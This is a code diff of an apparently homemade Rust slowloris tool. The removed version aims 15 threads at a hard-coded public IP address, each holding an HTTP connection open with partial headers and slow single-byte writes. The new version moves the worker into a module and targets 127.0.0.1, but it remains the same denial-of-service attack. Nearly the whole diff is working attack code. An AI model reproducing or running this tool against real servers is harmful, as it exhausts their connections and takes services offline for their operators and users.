@@ -1,43 +1,28 @@
-use rand::rngs::SmallRng;
-use rand::FromEntropy;
-use rand::Rng;
-use std::io::prelude::*;
-use std::net::TcpStream;
-use std::time::Duration;
-use std::thread;
+mod slowloris_worker;
+
 use scoped_threadpool::Pool;
-
-fn infinite_worker(num: u8, sleep_time: u8) {
-    println!("[slowloris_{}] Spawned.", num);
-
-    let mut stream = TcpStream::connect("142.251.32.100:80").expect("Connection failed.");
-
-    match stream.write_all("GET / HTTP/1.1\r\nUser-Agent: slowloris\r\n".as_bytes()) {
-        Ok(_) => println!("[slowloris_{}] Header sent.", num),
-        Err(_) => println!("[slowloris_{}] Header failed.", num),
-    }
-
-    let mut rng = SmallRng::from_entropy();
-
-    loop {
-        thread::sleep(Duration::from_secs(sleep_time as u64));
-        match stream.write_all(&rng.gen::<[u8; 1]>()) {
-            Ok(_) => println!("[slowloris_{}] Update sent.", num),
-            Err(_) => println!("[slowloris_{}] Update failed.", num),
-        }
-    }
-}
+use slowloris_worker::SlowlorisWorker;
+use std::net::TcpStream;
 
 fn main() {
     const NUM_THREADS: u8 = 15;
-    const SECONDS: u8 = 1;
+    const SECONDS: u8 = 30;
+
+    if TcpStream::connect("127.0.0.1:80").is_err() {
+        panic!("Connection failed. Is the server up?");
+    }
 
     let mut pool = Pool::new(NUM_THREADS as u32);
+    let mut num_workers = 0;
     pool.scoped(|scoped| {
-        for i in 0..NUM_THREADS {
-            scoped.execute(move || {
-                infinite_worker(i, SECONDS);
-            });
+        while num_workers < NUM_THREADS {
+            if let Ok(mut worker) = SlowlorisWorker::new(num_workers, SECONDS) {
+                println!("[slowloris_{:02}] Spawned.", num_workers);
+                scoped.execute(move || {
+                    worker.start();
+                });
+                num_workers += 1;
+            }
         }
     });
 }
